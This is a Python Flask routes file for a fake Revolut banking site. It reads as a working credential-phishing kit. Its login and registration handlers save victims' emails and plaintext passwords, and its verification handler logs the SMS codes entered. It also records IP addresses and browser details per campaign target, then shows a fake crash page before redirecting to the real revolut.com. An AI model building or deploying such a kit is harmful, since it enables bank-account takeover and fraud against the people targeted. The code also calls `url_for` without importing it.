# ==========================================
# routes/fake_revolut.py - Complete Implementation
# ==========================================

"""
Fake Revolut routes - Complete fake site implementation with tracking and credential capture
"""

from flask import Blueprint, request, redirect, render_template, session, jsonify
from datetime import datetime
import secrets
import random

# Import models for credential logging
from models.credential import Credential
from models.tracking import Tracking
from utils.database import db

bp = Blueprint('fake_revolut', __name__)

# === UTILITY FUNCTIONS ===

def get_campaign_target_info():
    """Extract campaign and target IDs from request"""
    campaign_id = request.args.get('c', 'unknown')
    target_id = request.args.get('t', 'unknown')
    return campaign_id, target_id

def get_client_info():
    """Extract client information for tracking"""
    return {
        'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR')),
        'user_agent': request.headers.get('User-Agent'),
        'referrer': request.headers.get('Referer'),
        'session_id': session.get('revolut_session_id', secrets.token_urlsafe(32))
    }

def track_page_visit(page_name):
    """Track page visit for analytics"""
    campaign_id, target_id = get_campaign_target_info()
    client_info = get_client_info()
    
    try:
        tracking_event = Tracking.create_event(
            campaign_id=campaign_id,
            event_type='page_visited',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'page': page_name},
            **client_info
        )
        print(f"Tracked page visit: {page_name} - Campaign: {campaign_id}, Target: {target_id}")
    except Exception as e:
        print(f"Error tracking page visit: {e}")

def capture_credentials_to_db(form_data, page_url, form_type='unknown'):
    """Capture credentials to database"""
    campaign_id, target_id = get_campaign_target_info()
    client_info = get_client_info()
    
    try:
        # Extract username/email and password
        username = form_data.get('email') or form_data.get('username', '')
        password = form_data.get('password', '')
        
        if username and password:
            credential = Credential(
                campaign_id=campaign_id,
                target_id=target_id if target_id != 'unknown' else None,
                username=username,
                password=password,
                page_url=page_url,
                form_data=str(form_data),
                credential_type='banking',
                **client_info
            )
            
            db.session.add(credential)
            db.session.commit()
            
            print(f"Captured credentials: {username} / {'*' * len(password)} - Campaign: {campaign_id}")
            return True
    except Exception as e:
        print(f"Error capturing credentials: {e}")
        db.session.rollback()
    
    return False

def check_interaction_threshold():
    """Check if user has reached interaction threshold for redirect"""
    interaction_count = session.get('revolut_interactions', 0)
    max_interactions = 5  # Redirect after 5 interactions
    
    if interaction_count >= max_interactions:
        return True
    return False

def increment_interactions():
    """Increment interaction counter"""
    session['revolut_interactions'] = session.get('revolut_interactions', 0) + 1
    session['revolut_session_id'] = session.get('revolut_session_id', secrets.token_urlsafe(32))

# === MAIN ROUTES ===

@bp.route('/')
def home():
    """Home page of fake Revolut site"""
    track_page_visit('home')
    increment_interactions()
    
    return render_template('revolut/home.html')

@bp.route('/login')
def login_page():
    """Login page"""
    track_page_visit('login')
    increment_interactions()
    
    # Check if should redirect to crash page
    if check_interaction_threshold():
        return redirect(url_for('fake_revolut.simulate_crash'))
    
    return render_template('revolut/login.html')

@bp.route('/login', methods=['POST'])
def login_submit():
    """Process login form submission"""
    form_data = dict(request.form)
    page_url = request.url
    client_info = get_client_info()
    
    # Track form submission
    campaign_id, target_id = get_campaign_target_info()
    try:
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='form_submitted',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'form_type': 'login', 'page': 'login'},
            **client_info
        )
    except Exception as e:
        print(f"Error tracking form submission: {e}")
    
    # Capture credentials
    capture_credentials_to_db(form_data, page_url, 'login')
    
    # Simulate processing time and redirect
    increment_interactions()
    session['user_logged_in'] = True
    session['user_name'] = form_data.get('email', 'User').split('@')[0].title()
    session['user_email'] = form_data.get('email', 'user@example.com')
    
    return redirect('/revolut/dashboard')

@bp.route('/register')
def register_page():
    """Registration page"""
    track_page_visit('register')
    increment_interactions()
    
    # Check if should redirect to crash page
    if check_interaction_threshold():
        return redirect(url_for('fake_revolut.simulate_crash'))
    
    return render_template('revolut/register.html')

@bp.route('/register', methods=['POST'])
def register_submit():
    """Process registration form submission"""
    form_data = dict(request.form)
    page_url = request.url
    client_info = get_client_info()
    
    # Track form submission
    campaign_id, target_id = get_campaign_target_info()
    try:
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='form_submitted',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'form_type': 'register', 'page': 'register'},
            **client_info
        )
    except Exception as e:
        print(f"Error tracking form submission: {e}")
    
    # Capture credentials
    capture_credentials_to_db(form_data, page_url, 'register')
    
    # Simulate processing and redirect to verification
    increment_interactions()
    session['user_registered'] = True
    session['user_name'] = f"{form_data.get('first_name', 'User')} {form_data.get('last_name', '')}"
    session['user_email'] = form_data.get('email', 'user@example.com')
    
    return redirect('/revolut/verify')

@bp.route('/verify')
def verify_page():
    """Phone verification page"""
    track_page_visit('verify')
    increment_interactions()
    
    # Check if should redirect to crash page
    if check_interaction_threshold():
        return redirect(url_for('fake_revolut.simulate_crash'))
    
    return render_template('revolut/verify.html')

@bp.route('/verify', methods=['POST'])
def verify_submit():
    """Process verification code submission"""
    form_data = dict(request.form)
    client_info = get_client_info()
    
    # Track verification attempt
    campaign_id, target_id = get_campaign_target_info()
    try:
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='form_submitted',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'form_type': 'verify', 'code': form_data.get('verification_code', '')},
            **client_info
        )
    except Exception as e:
        print(f"Error tracking verification: {e}")
    
    # Simulate successful verification
    increment_interactions()
    session['user_verified'] = True
    session['user_logged_in'] = True
    
    return redirect('/revolut/dashboard')

@bp.route('/dashboard')
def dashboard():
    """User dashboard"""
    track_page_visit('dashboard')
    increment_interactions()
    
    # Check if should redirect to crash page
    if check_interaction_threshold():
        return redirect(url_for('fake_revolut.simulate_crash'))
    
    user_name = session.get('user_name', 'John Doe')
    return render_template('revolut/dashboard.html', 
                         user_logged_in=True, 
                         user_name=user_name)

@bp.route('/profile')
def profile():
    """User profile page"""
    track_page_visit('profile')
    increment_interactions()
    
    # Check if should redirect to crash page
    if check_interaction_threshold():
        return redirect(url_for('fake_revolut.simulate_crash'))
    
    user_name = session.get('user_name', 'John Doe')
    user_email = session.get('user_email', 'john.doe@example.com')
    
    return render_template('revolut/profile.html', 
                         user_logged_in=True, 
                         user_name=user_name,
                         user_email=user_email)

# === API ENDPOINTS FOR INTERACTION TRACKING ===

@bp.route('/api/track', methods=['POST'])
def track_interaction():
    """API endpoint for tracking interactions via JavaScript"""
    try:
        data = request.get_json()
        campaign_id, target_id = get_campaign_target_info()
        client_info = get_client_info()
        
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='interaction',
            target_id=target_id if target_id != 'unknown' else None,
            event_data=data,
            **client_info
        )
        
        # Increment interaction counter
        increment_interactions()
        
        return jsonify({'status': 'success', 'interactions': session.get('revolut_interactions', 0)})
    except Exception as e:
        print(f"Error tracking interaction: {e}")
        return jsonify({'status': 'error'}), 500

# === REDIRECT LOGIC ===

@bp.route('/crash')
def simulate_crash():
    """Show crash page instead of immediately redirecting"""
    try:
        # Track the crash event
        campaign_id, target_id = get_campaign_target_info()
        client_info = get_client_info()
        
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='crash_page_shown',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'reason': 'interaction_threshold_reached', 'interactions': session.get('revolut_interactions', 0)},
            **client_info
        )
    except Exception as e:
        print(f"Error tracking crash: {e}")
    
    # Show crash page instead of redirecting
    return render_template('revolut/crash.html')

@bp.route('/reload')
def reload_after_crash():
    """Handle reload action - this redirects to real Revolut"""
    try:
        # Track the reload event
        campaign_id, target_id = get_campaign_target_info()
        client_info = get_client_info()
        
        Tracking.create_event(
            campaign_id=campaign_id,
            event_type='reload_clicked',
            target_id=target_id if target_id != 'unknown' else None,
            event_data={'final_redirect': True, 'interactions': session.get('revolut_interactions', 0)},
            **client_info
        )
    except Exception as e:
        print(f"Error tracking reload: {e}")
    
    # Clear session and redirect to real Revolut
    session.clear()
    return redirect('https://revolut.com')

# === ERROR HANDLING ===

@bp.errorhandler(404)
def revolut_not_found(error):
    """Custom 404 handler for Revolut routes"""
    # Redirect to real Revolut for unknown pages
    return redirect('https://revolut.com')

# === DEBUG ROUTE (Remove in production) ===

@bp.route('/debug')
def debug_info():
    """Debug information about current session"""
    if not request.args.get('debug') == 'true':
        return redirect('/revolut/')
    
    debug_data = {
        'session': dict(session),
        'interactions': session.get('revolut_interactions', 0),
        'campaign_id': request.args.get('c', 'unknown'),
        'target_id': request.args.get('t', 'unknown'),
        'client_info': get_client_info(),
        'should_redirect': check_interaction_threshold()
    }
    
    return f"<pre>{str(debug_data)}</pre>"